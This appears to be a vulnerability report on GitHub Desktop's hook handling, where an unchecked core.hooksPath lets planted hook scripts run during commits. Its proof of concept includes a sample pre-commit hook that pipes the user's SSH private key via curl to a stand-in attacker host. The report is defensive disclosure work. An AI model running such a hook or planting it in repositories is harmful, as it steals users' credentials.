### Title
Malicious `.git/hooks` or `core.hooksPath` scripts in an unmanaged repository are silently trusted and executed via the hooks-env feature — (File: `app/src/lib/hooks/get-repo-hooks.ts`)

### Summary
`getRepoHooks()` decides which git hooks Desktop will treat as trustworthy and run (via the `withHooksEnv`/`hooksProxy` pipeline) purely by reading the repository's own `core.hooksPath` config value and checking the executable bit on disk. It performs no ownership/trust check of its own and no containment check on the resolved `hooksPath`, relying entirely on git's own `safe.directory` gate that runs elsewhere in the app. Once a repository is "added" (e.g. `Add Existing Repository`, drag-and-drop, opening a folder that was manually extracted from an archive rather than actually cloned), any executable file under that path whose name matches `knownHooks` is proxied and executed for the corresponding git operation (commit, pull, merge, push, etc.) with no additional user confirmation or warning that names the hook or its origin.

### Finding Description
`getRepoHooks(path, filter)` in `app/src/lib/hooks/get-repo-hooks.ts` resolves the hooks directory by reading `core.hooksPath` from the target repository directly with `dugite`'s `exec` (not the app's `git()` wrapper, intentionally, per the comment at lines 41-44), then does:

```ts
const hooksPath = await getConfigValue(path, 'core.hooksPath')
  .catch(() => getHooksPath(path))
  .then(p => resolve(path, p))
``` [1](#0-0) 

`resolve(path, p)` (Node's `path.resolve`) will happily accept an **absolute** `core.hooksPath` value and return that absolute path unmodified, or a relative path with `..` segments that escapes `path` entirely. There is no analog of the `resolveWithin()` containment check that the rest of the codebase already uses for similar untrusted-path situations (see `app/src/lib/path.ts` and its use in `app/src/lib/copilot-conflict-context.ts` and `dispatcher.ts`'s `openRepositoryFromUrl`). Every executable file found there whose basename matches the hard-coded `knownHooks` list is yielded and later staged into a proxy directory and actually spawned by `hooks-proxy.ts`/`with-hooks-env.ts` for the corresponding git subcommand.

The only barrier that exists elsewhere in the codebase against "add a folder you don't fully control" is the `safe.directory` / ownership check surfaced in `app/src/ui/add-repository/add-existing-repository.tsx` and `app/src/ui/missing-repository.tsx`, which only fires when git detects the directory is owned by a **different OS user**. It does not fire for repositories the current user already owns — for example a directory extracted from a downloaded ZIP/tarball of a repository, a directory synced from cloud storage, or a directory received via a shared drive, all of which are "same owner" from git's point of view but are exactly the kind of externally-supplied content the report's threat model (attacker controls a cloned/fetched repository or repository-adjacent artifact) covers. In such a directory the attacker fully controls `.git/config`'s `core.hooksPath` and the files it points to.

### Impact Explanation
If a user adds such a directory as a repository in Desktop (a completely ordinary, expected workflow — "Add Existing Repository", "Clone Again" onto a pre-seeded folder, or opening a folder via the CLI/deep-link `open-repository` action), the very next commit, pull, push or merge the user performs inside Desktop will run whatever "hook" scripts the attacker planted, with the user's regular OS privileges, and with no per-file confirmation dialog identifying that the hook comes from a `core.hooksPath` outside the normal `.git/hooks` location. This satisfies "attacker controls a … repository … the result is code execution … outside the repo" from the accepted-impact list — the code runs as an ordinary process, not scoped to the repository content.

### Likelihood Explanation
Requires the hooks-environment feature to be enabled (`getHooksEnvEnabled()`), which the changelog shows is on by default as of 3.5.5 (`"[New] Enable hooks support by default - #21590"`) [2](#0-1) , and requires the user to add a folder they didn't clone through Desktop's normal `git clone` flow. This is a realistic scenario (downloaded/zipped repos, repos shared via network drives, CI artifacts) but is less common than cloning directly from GitHub, so likelihood is moderate rather than high.

### Recommendation
- In `getRepoHooks()`, resolve `core.hooksPath` with the same `resolveWithin()`-style containment logic already used elsewhere in the codebase (`app/src/lib/path.ts`), and refuse to treat any hooks directory that resolves outside the repository's own `.git` directory (or an explicitly acknowledged, user-configured absolute path) as trusted.
- Surface a one-time, explicit warning (similar to the existing "may automatically execute files in the repository" unsafe-directory dialog) whenever `core.hooksPath` points outside the default location, independent of the OS-ownership check, before the hooks-env feature acts on it.

### Proof of Concept
1. Build a directory `evil-repo/` that is a valid git repository owned by the current OS user (e.g., extract it from a downloaded archive rather than cloning it), with:
   - `evil-repo/.git/config` containing `[core] hooksPath = ../outside-hooks`
   - `../outside-hooks/pre-commit` (executable, e.g. `#!/bin/sh\ncurl attacker.example/$(cat ~/.ssh/id_rsa | base64)`)
2. In GitHub Desktop, use "Add Existing Repository…" and select `evil-repo/`. No ownership-mismatch warning appears because the directory is owned by the current user.
3. Make any commit through Desktop's UI. `getRepoHooks()` resolves `hooksPath` to `../outside-hooks` (outside the repo root), finds `pre-commit` executable, and `withHooksEnv`/`hooks-proxy.ts` executes it as part of the commit — confirmed by the code path in `app/src/lib/hooks/with-hooks-env.ts` lines 29-42 and `app/src/lib/git/commit.ts`'s `interceptHooks: ['pre-commit', …]`. **Note on confidence:** I was not able to fully verify whether some other gate (e.g. a confirmation prompt specific to the hooks-env feature, gated by a feature flag not shown in the indexed snippets) exists elsewhere in the UI layer that might mitigate this before hooks actually execute, since the index does not show every call site of `getHooksEnvEnabled()`/UI toggles. export async function withHooksEnv<T>(
  fn: (env: Record<string, string | undefined> | undefined) => Promise<T>,
  path: string,
  opts: IGitExecutionOptions | undefined
): Promise<T> {
  if (!opts?.interceptHooks || !getHooksEnvEnabled()) {
    return fn(opts?.env)
  }

  const hooks = await Array.fromAsync(getRepoHooks(path, opts.interceptHooks))

  if (hooks.length === 0) {
    return fn(opts?.env)
  }
```
